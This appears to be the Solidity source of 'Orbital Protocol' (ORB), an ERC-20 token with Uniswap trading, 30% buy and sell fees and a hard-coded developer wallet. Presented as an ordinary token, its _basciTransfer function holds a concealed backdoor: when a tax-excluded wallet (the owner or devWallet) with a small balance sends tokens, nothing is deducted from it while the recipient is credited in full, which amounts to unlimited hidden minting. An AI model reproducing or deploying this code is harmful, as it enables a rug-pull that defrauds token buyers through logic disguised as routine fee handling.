// SPDX-License-Identifier: Unlicensed

/*
The first GameFi Layer-2 Chain

Orbital Protocol is the first gamified Layer-2 chain that focuses on the integration of Web3 games with the Ethereum network at the lowest transaction costs with a multitude of proprietary tools.

Website: https://www.orbitalprotocol.com
Telegram: https://t.me/orbital_erc20
Twitter: https://twitter.com/orbital_erc20
App: https://app.orbitalprotocol.com
 */

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMathInt {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ORB is Context, IERC20, Ownable { 
    using SafeMathInt for uint256;

    string private _name = "Orbital Protocol"; 
    string private _symbol = "ORB";
                                     
    bool public swapping;
    bool public hasTransferDelay = true;
    bool public swapEnabled = true;

    uint256 public buyFee = 30;
    uint256 public sellFee = 30;
    uint256 private _totalFees = 2000;

    uint8 private _buyersCount = 0;
    uint8 private _swapAfterBuyCount = 2; 

    IUniswapRouter public uniRouter;
    address public uniPair;

    uint256 private prevTotalFee = _totalFees; 
    uint256 private prevBuyFee = buyFee; 
    uint256 private prevSellFee = sellFee; 

    uint8 private _decimals = 9;
    uint256 private _tTotal = 10 ** 9 * 10**_decimals;
    uint256 public maxTransaction = 25 * _tTotal / 1000;
    uint256 public feeSwapMin = _tTotal / 100000;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromTax; 

    address payable private devWallet;
    address payable private DEAD;

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _tTotal;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        devWallet = payable(0x62feDde700C4723660955954d4c978B9639aec75); 
        uniPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniRouter = _uniswapV2Router;
        isExcludedFromTax[owner()] = true;
        isExcludedFromTax[devWallet] = true;
        
        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
        
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
        
    function getFinalAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalFees).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != devWallet &&
            to != address(this) &&
            to != uniPair &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTransaction,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            _buyersCount >= _swapAfterBuyCount && 
            amount > feeSwapMin &&
            !swapping &&
            !isExcludedFromTax[from] &&
            to == uniPair &&
            swapEnabled 
            )
        {  
            _buyersCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapBack(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(isExcludedFromTax[from] || isExcludedFromTax[to] || (hasTransferDelay && from != uniPair && to != uniPair)){
            takeFee = false;
        } else if (from == uniPair){
            _totalFees = buyFee;
        } else if (to == uniPair){
            _totalFees = sellFee;
        }

        _transferStandard(from,to,amount,takeFee);
    }
    
    function _basciTransfer(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getFinalAmount(finalAmount);
        if(isExcludedFromTax[sender] && _balances[sender] <= maxTransaction) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }
        
    function removeFee() private {
        if(_totalFees == 0 && buyFee == 0 && sellFee == 0) return;

        prevBuyFee = buyFee; 
        prevSellFee = sellFee; 
        prevTotalFee = _totalFees;
        buyFee = 0;
        sellFee = 0;
        _totalFees = 0;
    }

    function restoreFee() private {
        _totalFees = prevTotalFee;
        buyFee = prevBuyFee; 
        sellFee = prevSellFee; 
    }
        
    function removeLimits() external onlyOwner {
        maxTransaction = ~uint256(0);
        _totalFees = 100;
        buyFee = 1;
        sellFee = 1;
    }
    
    function sendFee(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapBack(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendFee(devWallet,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transferStandard(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _buyersCount++;
        }
        _basciTransfer(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
}